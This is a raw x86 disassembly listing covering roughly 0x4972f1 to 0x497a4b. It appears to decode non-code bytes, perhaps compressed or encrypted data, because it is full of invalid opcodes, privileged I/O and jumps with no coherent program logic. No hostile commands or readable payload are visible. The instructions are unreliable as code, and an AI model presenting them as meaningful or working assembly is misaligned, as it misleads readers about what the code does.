  4972f1:	(bad)
  4972f4:	pop    ss
  4972f5:	xchg   edi,eax
  4972f6:	mov    ch,0x8a
  4972f8:	push   ss
  4972f9:	test   BYTE PTR [edi-0x225f5da9],dh
  4972ff:	xor    bl,BYTE PTR [ebx+0x20d0088b]
  497305:	addr16 mov bh,0x44
  497308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497309:	cmovno esi,DWORD PTR [ebx]
  49730c:	out    0x58,eax
  49730e:	inc    esp
  49730f:	pop    edx
  497310:	imul   ebp,esi,0xffffffe7
  497313:	dec    esi
  497314:	lods   eax,DWORD PTR ds:[esi]
  497315:	inc    edx
  497316:	fwait
  497317:	cmpxchg8b QWORD PTR [edx]
  49731a:	scas   al,BYTE PTR es:[edi]
  49731b:	inc    esi
  49731c:	lods   al,BYTE PTR ds:[esi]
  49731d:	(bad)  
  49731e:	xor    al,0xf
  497320:	sub    al,0x69
  497322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497323:	mov    ah,0xcb
  497325:	test   eax,0x2f0ac215
  49732a:	pop    es
  49732b:	xchg   DWORD PTR [esp+ebp*2+0x3b],ecx
  49732f:	xchg   edi,eax
  497330:	mov    bh,0x8f
  497332:	shl    BYTE PTR [edi-0x6068ed2e],0xac
  497339:	arpl   WORD PTR [eax-0x80],si
  49733c:	mov    edi,0x836325cf
  497341:	ins    BYTE PTR es:[edi],dx
  497342:	push   edi
  497343:	or     esp,DWORD PTR [ebp-0x7c]
  497346:	cwde   
  497347:	call   edi
  497349:	mov    ?,WORD PTR [ecx+esi*2+0x0]
  49734d:	fbstp  TBYTE PTR [edi]
  49734f:	pop    edi
  497350:	lods   al,BYTE PTR ds:[esi]
  497351:	or     ecx,DWORD PTR [eax-0x6b]
  497354:	outs   dx,DWORD PTR ds:[esi]
  497355:	ja     0x497391
  497357:	inc    esp
  497358:	ins    DWORD PTR es:[edi],dx
  497359:	cmp    BYTE PTR [esi-0x4adb2849],al
  49735f:	stos   BYTE PTR es:[edi],al
  497360:	mov    ch,0x27
  497362:	mov    al,0xaa
  497364:	or     DWORD PTR [edi+eax*2],ebp
  497367:	ja     0x4973de
  497369:	push   ebp
  49736a:	sbb    DWORD PTR [ebx],ebp
  49736c:	xlat   BYTE PTR ds:[ebx]
  49736d:	mov    DWORD PTR [esi-0x6f],0x5b9b0d86
  497374:	pop    ss
  497375:	bt     DWORD PTR [edx+eiz*2-0x5b],0xb7
  49737b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49737c:	and    edx,DWORD PTR [ebp+0x4a]
  49737f:	aaa    
  497380:	sahf   
  497381:	mov    edi,0x3dd26321
  497386:	(bad)  [edi+0x34]
  497389:	add    ebp,ebp
  49738b:	mov    edx,0x1f41179a
  497390:	add    eax,0x47135623
  497395:	(bad)  
  497396:	loopne 0x4973ac
  497398:	mov    es,WORD PTR [edi+esi*1-0x2513d331]
  49739f:	xor    al,0x77
  4973a1:	mov    edi,0x58349183
  4973a6:	mov    bh,0x3f
  4973a8:	xor    al,0x23
  4973aa:	or     ah,BYTE PTR [eax-0x5e8713d]
  4973b0:	mov    edi,0x16b0a742
  4973b5:	push   edi
  4973b6:	cmpxchg ecx,eax
  4973b9:	and    ah,al
  4973bb:	dec    edi
  4973bc:	fwait
  4973bd:	dec    edi
  4973be:	mov    dl,0x56
  4973c0:	(bad)  
  4973c2:	(bad)  
  4973c3:	cmp    DWORD PTR [edx-0x71],eax
  4973c6:	sbb    BYTE PTR [edx+0x15],ch
  4973c9:	sub    ecx,DWORD PTR [edi-0x2d517981]
  4973cf:	adc    DWORD PTR [edx+0x1f],esp
  4973d2:	pop    ds
  4973d3:	das    
  4973d4:	rcr    DWORD PTR [eax-0x73],1
  4973d7:	adc    ah,bh
  4973d9:	or     al,0x16
  4973db:	xor    al,0x35
  4973dd:	xlat   BYTE PTR ds:[ebx]
  4973de:	inc    ebx
  4973df:	dec    edi
  4973e0:	sar    DWORD PTR [eax+0x42df0a40],0x89
  4973e7:	pop    ebp
  4973e8:	and    BYTE PTR [ebp+0xf],dl
  4973eb:	lahf   
  4973ec:	not    DWORD PTR [esi+0x41]
  4973ef:	lods   al,BYTE PTR ds:[esi]
  4973f0:	add    DWORD PTR [edi+0x5606447],ecx
  4973f6:	or     esi,DWORD PTR [edi+0x5f]
  4973f9:	push   0x1f558823
  4973fe:	idiv   DWORD PTR [eax]
  497400:	pop    eax
  497401:	inc    ebx
  497402:	stos   BYTE PTR es:[edi],al
  497403:	outs   dx,DWORD PTR ds:[esi]
  497404:	xchg   DWORD PTR [edi-0x7f],ecx
  497407:	imul   ecx,DWORD PTR [ebp+0x12f76fc9],0xe76ab525
  497411:	ja     0x4973e8
  497413:	sub    ch,BYTE PTR [edi-0x38fc8030]
  497419:	mov    edi,0x41804408
  49741e:	mov    edi,0xb242ac24
  497423:	outs   dx,DWORD PTR ds:[esi]
  497424:	aaa    
  497425:	pop    es
  497426:	add    al,0xdb
  497428:	cmp    ah,BYTE PTR [edi+0x2399777]
  49742e:	rol    BYTE PTR [ebp+0x58],cl
  497431:	stos   DWORD PTR es:[edi],eax
  497432:	ins    DWORD PTR es:[edi],dx
  497433:	dec    ebp
  497434:	leave  
  497435:	push   ebp
  497436:	getsec 
  497438:	cmp    DWORD PTR ds:0xb79a529b,edx
  49743e:	jg     0x497446
  497440:	test   eax,0xf42c212
  497445:	add    eax,esp
  497447:	call   0x440a:0x2fbf5b36
  49744e:	popa   
  49744f:	popf   
  497450:	pop    ss
  497451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497452:	pop    eax
  497453:	inc    edi
  497454:	ret    0xde85
  497457:	bswap  ecx
  497459:	adc    al,0x89
  49745b:	inc    edx
  49745c:	aaa    
  49745d:	jg     0x49748f
  49745f:	add    edx,DWORD PTR [esi]
  497461:	sbb    bl,BYTE PTR [eax]
  497463:	jg     0x4974b4
  497465:	in     al,0xab
  497467:	xchg   ebx,eax
  497468:	pop    eax
  497469:	dec    edi
  49746a:	inc    esi
  49746b:	add    BYTE PTR [eax],dh
  49746d:	and    edx,DWORD PTR [ecx]
  49746f:	dec    eax
  497470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  497471:	xor    edi,esp
  497473:	add    BYTE PTR [ebx+0x72376266],ch
  497479:	(bad)  
  49747a:	fadd   DWORD PTR [eax+0x1f]
  49747d:	(bad)  
  49747e:	mov    DWORD PTR ss:[eax-0x60b9de2c],eax
  497485:	bound  ebp,QWORD PTR [edx+0x78e71a4]
  49748b:	inc    esi
  49748c:	sbb    BYTE PTR [esi],0x89
  49748f:	dec    esi
  497490:	and    dl,BYTE PTR [di]
  497493:	sbb    eax,DWORD PTR [edx-0x58]
  497496:	pop    ds
  497497:	out    dx,eax
  497498:	xor    al,0x8
  49749a:	ins    DWORD PTR es:[edi],dx
  49749b:	imul   esi,DWORD PTR [edi+0x14],0x72
  49749f:	or     al,0x84
  4974a1:	dec    edi
  4974a2:	xor    al,0xe1
  4974a4:	bound  edx,QWORD PTR [edx-0x57be687c]
  4974aa:	aam    0x45
  4974ac:	sbb    al,0x3f
  4974ae:	aas    
  4974af:	(bad)  
  4974b0:	stos   BYTE PTR es:[edi],al
  4974b1:	xchg   esi,eax
  4974b2:	jne    0x4974db
  4974b4:	pop    es
  4974b5:	mov    DWORD PTR [ebp+0x61],esi
  4974b8:	push   ebp
  4974b9:	lahf   
  4974ba:	jg     0x497527
  4974bc:	stos   BYTE PTR es:[edi],al
  4974bd:	inc    ebp
  4974be:	xor    DWORD PTR [edi+0x5f],ebx
  4974c1:	xor    ebp,DWORD PTR [esi]
  4974c3:	(bad)  
  4974c4:	aad    0x25
  4974c6:	xchg   edi,edi
  4974c8:	push   ebp
  4974c9:	push   ecx
  4974ca:	inc    eax
  4974cb:	and    BYTE PTR [edi-0x5a6ca53f],bh
  4974d1:	inc    edi
  4974d2:	shr    BYTE PTR [edx+0x7fcfac00],1
  4974d8:	mov    ebx,DWORD PTR [eax+0x11]
  4974db:	push   ebx
  4974dc:	scas   eax,DWORD PTR es:[edi]
  4974dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4974de:	int3   
  4974df:	mov    eax,0x3332f782
  4974e4:	das    
  4974e5:	inc    ecx
  4974e6:	adc    eax,0xdfffb6b1
  4974eb:	ret    
  4974ec:	pop    eax
  4974ed:	sub    BYTE PTR [ecx+0x55a91fe7],bh
  4974f3:	imul   esi,DWORD PTR ds:0x6108ff47,0x5c
  4974fa:	and    eax,0xdd7449f
  4974ff:	xlat   BYTE PTR ds:[ebx]
  497500:	fs and eax,0xbf32cf
  497506:	lods   eax,DWORD PTR ds:[esi]
  497507:	mov    ds:0x45d6df81,al
  49750c:	add    ebx,DWORD PTR [ebx-0x74fe4859]
  497512:	sbb    edx,DWORD PTR [esi]
  497514:	lahf   
  497515:	adc    al,bl
  497517:	mov    al,0x6
  497519:	push   edi
  49751a:	div    DWORD PTR [edi]
  49751c:	push   esi
  49751d:	pop    ebx
  49751e:	fisub  WORD PTR [ebp+0x4526129f]
  497524:	jmp    FWORD PTR [edx+0x5b]
  497527:	lahf   
  497528:	xor    al,BYTE PTR [edi-0x69]
  49752b:	fisubr DWORD PTR [eax+0x33f8405]
  497531:	mov    ds:0xe3d4f83b,al
  497536:	mov    bl,0x92
  497538:	push   edi
  497539:	add    eax,edx
  49753b:	or     BYTE PTR [esi],cl
  49753d:	xor    al,0x57
  49753f:	and    BYTE PTR [esi-0x6858aa7f],dl
  497545:	enter  0x8e06,0xe0
  497549:	inc    esp
  49754a:	xchg   edi,eax
  49754b:	xor    DWORD PTR ds:0x77a94866,ebp
  497551:	aaa    
  497552:	lock adc DWORD PTR ss:[eax-0x26],ebx
  497557:	mov    bh,0x3
  497559:	add    al,0x4f
  49755b:	(bad)  
  49755c:	or     bh,BYTE PTR [edi-0xebb68ad]
  497562:	and    dl,BYTE PTR [esi]
  497564:	out    0x97,al
  497566:	pop    eax
  497567:	adc    DWORD PTR [edx],ebx
  497569:	or     bh,dl
  49756b:	int    0x4b
  49756d:	pop    eax
  49756e:	sub    DWORD PTR [edi],ecx
  497570:	jg     0x4975a9
  497572:	aaa    
  497573:	mov    ch,0x9b
  497575:	dec    eax
  497576:	and    DWORD PTR [edi],ecx
  497578:	call   0x3ffb4a15
  49757d:	sub    esp,DWORD PTR ds:0x8f2d082c
  497583:	xor    DWORD PTR [ebx+0x1a],eax
  497586:	mov    cl,0x9f
  497588:	aaa    
  497589:	or     al,0x11
  49758b:	xchg   edi,eax
  49758c:	pop    eax
  49758d:	mul    DWORD PTR [esi]
  49758f:	mov    ah,0x1b
  497591:	push   edi
  497592:	out    0x39,eax
  497594:	pop    ds
  497595:	loope  0x497518
  497597:	pop    ebp
  497598:	jmp    0x4975d1
  49759a:	out    dx,eax
  49759b:	sub    dl,BYTE PTR [ebp+0x4f6eb900]
  4975a1:	mov    ss:0xef12ab4a,eax
  4975a7:	mul    DWORD PTR [edx+0x170306ae]
  4975ad:	ss jo  0x4975c3
  4975b0:	pop    ds
  4975b1:	stos   DWORD PTR es:[edi],eax
  4975b2:	push   DWORD PTR [edi+0x1580a357]
  4975b8:	pop    edx
  4975b9:	xchg   edi,eax
  4975ba:	outs   dx,DWORD PTR ds:[esi]
  4975bb:	aad    0x2a
  4975bd:	imul   esi,DWORD PTR gs:[edi+0x22],0x81226215
  4975c5:	lahf   
  4975c6:	sub    al,BYTE PTR [edx]
  4975c8:	imul   eax,DWORD PTR [edi+eax*1],0xfffffff7
  4975cc:	adc    ebx,esp
  4975ce:	add    BYTE PTR [esi],ch
  4975d0:	aaa    
  4975d1:	aaa    
  4975d2:	aaa    
  4975d3:	adc    eax,0x77085122
  4975d8:	pop    edi
  4975d9:	pop    eax
  4975da:	add    ebp,DWORD PTR [ecx+0x703767a3]
  4975e0:	sub    edx,DWORD PTR [ecx]
  4975e2:	pop    ecx
  4975e3:	pop    ss
  4975e4:	addr16 cmp al,0x8c
  4975e7:	inc    ebx
  4975e8:	pop    eax
  4975e9:	xlat   BYTE PTR ds:[ebx]
  4975ea:	mov    edi,0x28d42a3c
  4975ef:	mov    bh,0xe
  4975f1:	cmp    DWORD PTR [esi],ecx
  4975f3:	(bad)  
  4975f5:	xchg   edx,eax
  4975f6:	aaa    
  4975f7:	rcl    BYTE PTR [edi+0xa],cl
  4975fa:	or     BYTE PTR [ebx+0x25],0xe7
  4975fe:	iret   
  4975ff:	mov    dl,0x81
  497601:	les    esi,FWORD PTR [eax-0x3f47cf39]
  497607:	mov    ds:0x92974f17,al
  49760c:	ds pusha 
  49760e:	fst    st(7)
  497610:	pop    es
  497611:	inc    ebp
  497612:	jno    0x49761f
  497614:	pop    edx
  497615:	sbb    eax,0x3c4e874f
  49761a:	or     BYTE PTR [edx-0x35],0xff
  49761e:	popa   
  49761f:	dec    edx
  497620:	mov    esi,0x4431ceb5
  497625:	mov    ah,0x2d
  497627:	push   0xffffffac
  497629:	setg   bh
  49762c:	sub    esp,DWORD PTR [edx]
  49762e:	xchg   ecx,eax
  49762f:	cmp    BYTE PTR [edi-0x61],dh
  497632:	xchg   esp,eax
  497633:	cmp    al,0x44
  497635:	lea    eax,[esi-0x61]
  497638:	xor    eax,0x1ade3500
  49763d:	sub    DWORD PTR ss:[edi+0x1634de0f],eax
  497644:	out    dx,al
  497645:	aam    0x48
  497647:	pop    ss
  497648:	aaa    
  497649:	ret    0x48aa
  49764c:	popf   
  49764d:	lahf   
  49764e:	ja     0x497686
  497650:	push   esp
  497651:	or     ch,BYTE PTR [ebx]
  497653:	xlat   BYTE PTR ds:[ebx]
  497654:	das    
  497655:	xor    esi,DWORD PTR [edi+0x2c298158]
  49765b:	xlat   BYTE PTR ds:[ebx]
  49765c:	ret    0x5163
  49765f:	fidiv  DWORD PTR [edi+0x5420c15e]
  497665:	sbb    cl,BYTE PTR [edi]
  497667:	(bad)  
  497668:	scas   eax,DWORD PTR es:[edi]
  497669:	rol    DWORD PTR [eax-0x79],0x51
  49766d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49766e:	ss push eax
  497670:	mov    al,ds:0xaf5f8915
  497675:	daa    
  497676:	test   al,0x15
  497678:	and    al,0x82
  49767a:	push   edi
  49767b:	pop    es
  49767c:	or     BYTE PTR [edx+ebp*8+0x6],dl
  497680:	push   edi
  497681:	pop    eax
  497682:	push   eax
  497683:	arpl   WORD PTR ds:0x4184787,dx
  497689:	or     dh,ah
  49768b:	mov    BYTE PTR [edi-0xa],0x54
  49768f:	sbb    DWORD PTR [ebx],ebp
  497691:	mov    eax,0x98e7bf77
  497696:	popa   
  497697:	jne    0x4976bc
  497699:	xchg   edi,eax
  49769a:	jecxz  0x4976e0
  49769c:	sbb    eax,0xbf432601
  4976a1:	pop    ss
  4976a2:	mov    ebp,DWORD PTR [ecx-0x29]
  4976a5:	scas   al,BYTE PTR es:[edi]
  4976a6:	addr16 pop ds
  4976a8:	pop    ds
  4976a9:	add    al,0xa5
  4976ab:	inc    esp
  4976ac:	mov    DWORD PTR ds:0xb8dc531f,esi
  4976b2:	call   0x44f8af5e
  4976b7:	rcl    BYTE PTR [esi+eax*2-0x6d8018f0],1
  4976be:	add    BYTE PTR [ecx-0x4fcd18e0],0x4b
  4976c5:	inc    esp
  4976c6:	stos   BYTE PTR es:[edi],al
  4976c7:	pop    ds
  4976c8:	fwait
  4976c9:	sbb    ch,BYTE PTR [ecx+0xf5fdada]
  4976cf:	icebp  
  4976d0:	test   BYTE PTR [ebx+eiz*4],cl
  4976d3:	push   edi
  4976d4:	jg     0x4976dd
  4976d6:	fstp   QWORD PTR [eax-0x7f]
  4976d9:	push   ebp
  4976da:	aaa    
  4976db:	addr16 (bad) 
  4976dd:	jno    0x497730
  4976df:	sub    eax,0x42774643
  4976e4:	lahf   
  4976e5:	dec    eax
  4976e6:	dec    ebp
  4976e7:	adc    al,0x37
  4976e9:	sbb    eax,DWORD PTR [ebp-0x70a69175]
  4976ef:	inc    esp
  4976f0:	stos   DWORD PTR es:[edi],eax
  4976f1:	(bad)  
  4976f2:	sbb    BYTE PTR [esi+0x13472777],bh
  4976f8:	scas   al,BYTE PTR es:[edi]
  4976f9:	inc    edx
  4976fa:	inc    eax
  4976fb:	push   edi
  4976fc:	fistp  WORD PTR ss:[edx+0x5a]
  497700:	push   0x394687c0
  497705:	shr    DWORD PTR [eax+0x62],1
  497708:	push   ebp
  497709:	mul    DWORD PTR [edi-0x7e]
  49770c:	or     al,BYTE PTR [edi-0x74]
  49770f:	mov    DWORD PTR [ebp+0x27],0x440aab1b
  497716:	iret   
  497717:	aam    0x76
  497719:	inc    ecx
  49771a:	gs out dx,eax
  49771c:	xor    DWORD PTR [edi],eax
  49771e:	lods   eax,DWORD PTR ds:[esi]
  49771f:	sbb    DWORD PTR [eax],0xc43ff70d
  497725:	sub    dh,BYTE PTR [esp+esi*1]
  497728:	iret   
  497729:	ss pop ds
  49772b:	xchg   BYTE PTR [ecx],ah
  49772d:	cdq    
  49772e:	pop    eax
  49772f:	outs   dx,DWORD PTR ds:[esi]
  497730:	xor    BYTE PTR [edi+ecx*8+0x68],al
  497734:	or     esp,DWORD PTR [esp+ebp*1]
  497737:	inc    edi
  497738:	ja     0x497755
  49773a:	inc    ebx
  49773b:	lods   al,BYTE PTR ds:[esi]
  49773c:	fs xor eax,0x88daa8a2
  497742:	cmp    DWORD PTR [edi+0x9f7fb30],0x22
  497749:	sti    
  49774a:	sar    bl,0x3f
  49774d:	pop    es
  49774e:	xchg   ebp,eax
  49774f:	xchg   edx,eax
  497750:	mov    ebx,DWORD PTR [edi+0x35]
  497753:	pop    DWORD PTR [eax+0x575600c0]
  497759:	inc    edx
  49775a:	loopne 0x4976ee
  49775c:	(bad)  
  49775d:	out    dx,eax
  49775e:	jg     0x49770c
  497760:	xor    eax,0x178b2d79
  497765:	aad    0x40
  497767:	and    DWORD PTR [edi],esp
  497769:	mov    bl,0xb7
  49776b:	add    dl,BYTE PTR [ecx+0x53]
  49776e:	shl    BYTE PTR [esi],cl
  497770:	xchg   eax,edx
  497772:	sub    eax,0xcb67e516
  497777:	ret    0xb756
  49777a:	lods   al,BYTE PTR ds:[esi]
  49777b:	lea    esi,[ebx]
  49777d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49777e:	push   ecx
  49777f:	stos   DWORD PTR es:[edi],eax
  497780:	pop    ecx
  497781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497782:	aaa    
  497783:	dec    ecx
  497784:	jl     0x49772b
  497786:	or     bl,bh
  497788:	arpl   WORD PTR [ebp+0x370aad48],si
  49778e:	ja     0x497714
  497790:	inc    edx
  497791:	call   0x1422:0x5565758
  497798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497799:	das    
  49779a:	mov    eax,ds:0x7706ab94
  49779f:	aaa    
  4977a0:	jecxz  0x4977ac
  4977a2:	pop    eax
  4977a3:	or     DWORD PTR [edx-0x1],esp
  4977a6:	mov    eax,0x9bed0a5d
  4977ab:	xchg   DWORD PTR [ebx],esi
  4977ad:	xor    dl,dl
  4977af:	ins    BYTE PTR es:[edi],dx
  4977b0:	jecxz  0x4977da
  4977b2:	cmove  eax,edi
  4977b5:	push   esi
  4977b6:	or     al,0x84
  4977b8:	sbb    BYTE PTR [edi-0x61],ch
  4977bb:	and    dh,BYTE PTR [ebp+edx*4+0x45c76fa2]
  4977c2:	ret    0x410a
  4977c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4977c6:	fbstp  TBYTE PTR [eax-0x1d]
  4977c9:	add    al,0x80
  4977cb:	push   edi
  4977cc:	bound  esp,QWORD PTR [ecx]
  4977ce:	push   edi
  4977cf:	cmp    esp,DWORD PTR [eax+0x930ff3f]
  4977d5:	or     cl,BYTE PTR es:[ebx+0x42389f42]
  4977dc:	and    DWORD PTR [ebp+0x71f0736],esp
  4977e2:	or     DWORD PTR [esi-0x30d04870],ebx
  4977e8:	stos   DWORD PTR es:[edi],eax
  4977e9:	and    BYTE PTR [eax+ebx*2],dh
  4977ec:	daa    
  4977ed:	pop    edi
  4977ee:	imul   ecx,DWORD PTR [ecx+0x3a],0x2
  4977f2:	xlat   BYTE PTR ds:[ebx]
  4977f3:	inc    esi
  4977f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4977f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4977f6:	push   esi
  4977f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4977f8:	push   ecx
  4977f9:	xor    edx,DWORD PTR [edi+0xf]
  4977fc:	push   0x5f482da3
  497801:	jg     0x4977ca
  497803:	pusha  
  497804:	mov    ds:0xffb641a8,eax
  497809:	sbb    BYTE PTR [eax-0x3c],bh
  49780c:	mov    BYTE PTR [edi-0x214d72b9],ch
  497812:	inc    esi
  497813:	inc    ebx
  497814:	(bad)  
  497815:	addr16 inc ecx
  497817:	inc    eax
  497818:	lods   al,BYTE PTR ds:[esi]
  497819:	xchg   BYTE PTR [edi+0x37],dl
  49781c:	pop    eax
  49781d:	adc    eax,0xbf2fa201
  497822:	adc    al,0x6c
  497824:	shr    BYTE PTR [eax+0x67],0x4f
  497828:	mov    edi,0xc1186810
  49782d:	xor    al,0x87
  49782f:	outs   dx,DWORD PTR ds:[esi]
  497830:	imul   ecx,DWORD PTR [ebp-0x1000da2a],0xa460f9d3
  49783a:	out    0xff,eax
  49783c:	xor    edi,edi
  49783e:	inc    ebp
  49783f:	inc    ebp
  497840:	popa   
  497841:	adc    al,0xf
  497843:	sub    ah,BYTE PTR [ecx+0x6a]
  497846:	enter  0x4e44,0x35
  49784a:	stos   BYTE PTR es:[edi],al
  49784b:	ss adc eax,0x8b501748
  497851:	adc    eax,eax
  497853:	lds    eax,FWORD PTR [bx+si-0x4970]
  497858:	jg     0x497889
  49785a:	paddq  mm1,QWORD PTR [esi+0x64]
  49785e:	pop    eax
  49785f:	das    
  497860:	lahf   
  497861:	adc    cl,al
  497863:	xor    eax,0xeb30d791
  497868:	mov    DWORD PTR [edx+0x3a],eax
  49786b:	pop    ds
  49786c:	pop    ss
  49786d:	pop    eax
  49786e:	inc    esp
  49786f:	lods   eax,DWORD PTR ds:[esi]
  497870:	and    dh,BYTE PTR [edi+0x460b5dc3]
  497876:	adc    BYTE PTR [edi],0x5f
  497879:	push   esi
  49787a:	test   DWORD PTR [ebx-0x68be20aa],edi
  497880:	and    ah,BYTE PTR [ecx]
  497882:	add    eax,0x9f07878b
  497887:	pop    edx
  497888:	test   DWORD PTR [ecx+0xd],eax
  49788b:	mov    bh,0x51
  49788d:	or     DWORD PTR [eax+0x2f392f22],ebx
  497893:	mov    ecx,0xc72a48ba
  497898:	xor    DWORD PTR [ebp-0x78eaceab],ebp
  49789e:	pusha  
  49789f:	add    BYTE PTR [ebx-0x5c],ah
  4978a2:	arpl   WORD PTR [ecx+0x3],si
  4978a5:	rol    cl,0xe7
  4978a8:	xor    esi,edi
  4978aa:	lods   al,BYTE PTR ds:[esi]
  4978ab:	adc    DWORD PTR [eax-0x75c8b5d2],edx
  4978b1:	popa   
  4978b2:	popa   
  4978b3:	jne    0x49787c
  4978b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4978b6:	rol    DWORD PTR [eax+0x6f8fc080],cl
  4978bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4978bd:	shr    BYTE PTR [ebp-0x58],cl
  4978c0:	xor    BYTE PTR [edi+0xaac080],dl
  4978c6:	cmpxchg BYTE PTR [edx-0x5090c950],ch
  4978cd:	cs push 0xbf670654
  4978d3:	add    al,0xa6
  4978d5:	push   ds
  4978d6:	xor    al,0xf
  4978d8:	(bad)  
  4978d9:	lods   al,BYTE PTR ds:[esi]
  4978da:	jmp    0x9f7995a8
  4978df:	das    
  4978e0:	ror    BYTE PTR [edx-0x72],cl
  4978e3:	sub    BYTE PTR [esi+0x36],dh
  4978e6:	add    cl,BYTE PTR [ebp+0x6b1fad27]
  4978ec:	cmp    ah,BYTE PTR [esp+eiz*2]
  4978ef:	push   0xc5633b7
  4978f4:	xor    al,0x42
  4978f6:	lds    ebp,FWORD PTR [edi-0x16a9e839]
  4978fc:	pop    eax
  4978fd:	pop    ds
  4978fe:	test   DWORD PTR [edi],0x1506b884
  497904:	jg     0x49788d
  497906:	pop    ss
  497907:	mov    cl,0xa
  497909:	dec    esp
  49790a:	xlat   BYTE PTR ds:[ebx]
  49790b:	pop    edi
  49790c:	stos   BYTE PTR es:[edi],al
  49790d:	add    eax,0xbe8b5b9c
  497912:	(bad)  
  497913:	shr    BYTE PTR [edx-0x57804e70],1
  497919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49791a:	push   ss
  49791b:	sbb    edi,esp
  49791d:	out    dx,eax
  49791e:	add    cl,BYTE PTR [eax]
  497920:	inc    ebx
  497921:	push   ebx
  497922:	iret   
  497923:	xor    eax,0x9156829f
  497928:	nop
  497929:	fild   WORD PTR [eax-0x70ae7716]
  49792f:	xor    BYTE PTR [edi],dh
  497931:	je     0x497905
  497933:	cwde   
  497934:	fcom   st(7)
  497936:	ss iret 
  497938:	bound  eax,QWORD PTR [eax+0x21]
  49793b:	sub    BYTE PTR [edi+0x23],cl
  49793e:	jne    0x497988
  497940:	sar    dh,1
  497942:	lahf   
  497943:	test   BYTE PTR [eax+0x503f209a],dh
  497949:	call   0x7818a6fb
  49794e:	das    
  49794f:	xlat   BYTE PTR ds:[ebx]
  497950:	enter  0x4cc1,0x61
  497954:	iret   
  497955:	cmp    BYTE PTR [ecx],dl
  497957:	add    BYTE PTR [edi-0x703138b5],0xb5
  49795e:	je     0x497979
  497960:	push   edx
  497961:	addr16 jb 0x4979c3
  497964:	mov    ds:0xc756902d,eax
  497969:	outs   dx,DWORD PTR ds:[esi]
  49796a:	aam    0x15
  49796c:	push   eax
  49796d:	xchg   ebx,eax
  49796e:	xor    BYTE PTR [edi],ah
  497970:	inc    ebx
  497971:	rol    BYTE PTR [edi-0x60],cl
  497974:	add    BYTE PTR [edi-0x54effd39],ah
  49797a:	xchg   edx,eax
  49797b:	(bad)  
  49797d:	dec    eax
  49797e:	popf   
  49797f:	xchg   edx,eax
  497980:	mov    cl,0x7f
  497982:	imul   ecx,DWORD PTR [edx+0x7e],0x32383748
  497989:	xchg   ebp,eax
  49798a:	lea    edx,[ebp+ebp*2-0x49]
  49798e:	pop    edi
  49798f:	cwde   
  497990:	mov    ah,0x8b
  497992:	pop    edx
  497993:	inc    edi
  497994:	pop    es
  497995:	push   eax
  497996:	dec    edx
  497997:	xchg   esp,eax
  497998:	cmp    dh,BYTE PTR [edi+eiz*1]
  49799b:	mov    DWORD PTR [edx+0x43c74aba],ecx
  4979a1:	lahf   
  4979a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4979a3:	push   cs
  4979a4:	adc    DWORD PTR [eax+0x5810ff37],edx
  4979aa:	stos   DWORD PTR es:[edi],eax
  4979ab:	or     bh,BYTE PTR [edi-0x59]
  4979ae:	mov    dh,0x9a
  4979b0:	or     DWORD PTR [ecx-0x69],ebp
  4979b3:	sahf   
  4979b4:	push   ebp
  4979b5:	xor    al,BYTE PTR [esi]
  4979b7:	xchg   ebx,eax
  4979b8:	ss xchg esi,eax
  4979ba:	mov    edi,0x203c0805
  4979bf:	jecxz  0x4979a8
  4979c1:	sub    cl,dh
  4979c3:	mov    BYTE PTR [ecx],al
  4979c5:	imul   ebx,edi,0xffffffd2
  4979c8:	lods   eax,DWORD PTR ds:[esi]
  4979c9:	dec    ebp
  4979ca:	add    ebp,DWORD PTR [edi-0x5fe273c9]
  4979d0:	sahf   
  4979d1:	jcxz   0x4979f7
  4979d4:	adc    BYTE PTR [ebp-0x49],0xc7
  4979d8:	inc    edi
  4979d9:	and    al,0x6
  4979db:	adc    eax,DWORD PTR [ebx+0x39]
  4979de:	das    
  4979df:	sub    BYTE PTR [eax+eax*4],ah
  4979e2:	addr16 neg edi
  4979e5:	sbb    al,BYTE PTR [esi]
  4979e7:	or     esp,esp
  4979e9:	xor    bl,BYTE PTR [edi]
  4979eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4979ec:	and    eax,0x16
  4979ef:	push   edi
  4979f0:	pop    edx
  4979f1:	out    dx,eax
  4979f2:	inc    esp
  4979f3:	or     esi,esi
  4979f5:	test   DWORD PTR [edi+edx*1-0xa],edx
  4979f9:	inc    ebp
  4979fa:	mov    edi,0x92c4c38a
  4979ff:	cmp    BYTE PTR [edi-0x22b6776c],bh
  497a05:	es pop ss
  497a07:	push   eax
  497a08:	fwait
  497a09:	mov    BYTE PTR [ebx],0x1b
  497a0c:	dec    edi
  497a0d:	xchg   ebp,eax
  497a0e:	mov    ah,0x30
  497a10:	pop    ebx
  497a11:	pop    ds
  497a12:	xor    al,0xf
  497a14:	add    BYTE PTR [esi+0x8],dh
  497a17:	pop    edx
  497a18:	addr16 mov ah,0x2e
  497a1b:	and    al,0xcd
  497a1d:	mov    esi,0x1b004e32
  497a22:	and    BYTE PTR [edi+ebp*1+0x57],ch
  497a26:	mov    ch,0x62
  497a28:	and    eax,0xd41fcf2a
  497a2d:	lds    esp,FWORD PTR [eax]
  497a2f:	mov    al,ds:0x8371e357
  497a34:	dec    eax
  497a35:	lea    ecx,[edi]
  497a37:	xchg   DWORD PTR [eax-0x38b9fbb7],eax
  497a3d:	xor    BYTE PTR [eax-0x7b],ah
  497a40:	ret    0x4f87
  497a43:	xchg   edx,eax
  497a44:	dec    edx
  497a45:	or     DWORD PTR [edx],0x25c834b6
  497a4b:	sub    eax,0xc3375e24
